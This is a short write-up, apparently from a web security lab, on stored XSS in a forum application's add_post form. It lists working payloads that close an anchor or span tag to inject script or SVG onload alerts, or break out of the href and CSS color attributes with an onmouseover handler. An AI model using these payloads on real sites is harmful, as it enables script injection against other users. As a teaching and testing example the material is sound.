## Stored XSS attack with HTML attributes:

Target : add_post
The attack displayed on : forum.php



## Targeting href attributes in URL field of the form.

This where XSS can be loaded in the forum.php page

<a  href="                   XSS payload                           " style="color: ..." > ... </a>

It is possible for the attacker to insert any of these two lines in add_post as url.

           ">close a tag</a> <script>alert("ok4")</script> <a href="
           ">close a tag</a><svg onload=alert(5)> <a href="


## Targeting CSS style attribute through CSS color in the color field of the form.

The attacker can use inspect tool from the browser to change selection to text. Then, insert any of these:
  red" onmouseover="alert(7)
  red">close a tag</a> <script>alert("ok6")</script> <a href="
  20">close a tag</span> <script>alert("ok7")</script> <span style="

This will be reflected in the color style in the css of `forum.php` page
<a  href=""  style="color:  XSS payload   ">  message </a>


## What if inspect tool is blocked? 
The attacker can run the same attack using a python script. 
Check `xss_python.py` file.